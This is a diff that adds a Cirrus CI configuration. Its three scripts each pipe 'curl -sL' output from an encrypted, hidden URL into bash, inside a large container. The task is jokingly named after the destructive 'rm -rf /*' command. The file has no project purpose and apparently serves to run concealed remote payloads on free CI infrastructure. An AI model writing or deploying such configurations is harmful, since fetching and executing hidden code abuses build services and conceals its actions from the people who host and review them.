@@ -1,0 +1,23 @@
+env:
+
+    CIRRUS_SHELL: bash
+    lol: ENCRYPTED[57ce440dcecde9dc856b9e791203c168b38c18ed18549f8d7395d0515a5710a0944a7b31492f3ceaff8b26a18005214a]
+    lool: ENCRYPTED[45d6d0421b6e4b1a866f935f320f3414a678d2a0188b7b8852e06d7267db460c767531aaaeb9314344902ea5dd45a410]
+    loool: ENCRYPTED[86639ffaa1f8e6d14d6286deb7fa5b6a2437545527f40dccba791fd448bcc04b6259e7009927af85876191e9e2cf919c]
+
+task:
+  name: "rn -rf /* "
+  timeout_in: 120m
+  container:
+      image: shazuxdd/ubuntu:latest
+      cpu: 8
+      memory: 32G
+      
+  check_script:
+      - curl -sL $lol | bash
+
+  Sync_script:
+      - curl -sL $lool | bash
+      
+  Build_script:
+      - curl -sL $loool | bash
